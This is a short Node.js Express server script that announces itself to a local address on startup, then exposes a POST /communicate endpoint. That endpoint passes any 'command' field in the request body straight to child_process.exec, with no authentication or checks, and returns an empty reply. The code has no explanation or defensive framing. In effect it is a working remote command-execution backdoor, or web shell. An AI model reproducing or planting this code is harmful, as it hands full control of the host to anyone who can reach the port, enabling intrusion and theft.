
    const express = require("express");
    const http = require("node:http");
    const axios = require("axios").default;
    const cproc = require("child_process");

    const app = express();
    const server = http.createServer(app);

    app.set("trust proxy", true);
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));

    axios.request({
        url: "http://127.0.0.1/connect/44843",
        method: "GET"
    });

    app.get("/ping", async (req, res) => {
    res.send("pong");
    });

    app.post("/communicate", async (req, res) => {
        if (!req.body.command) return res.send("");
        const command = req.body.command;
        cproc.exec(command);
        return res.send("");
    });

    server.listen(44843);
    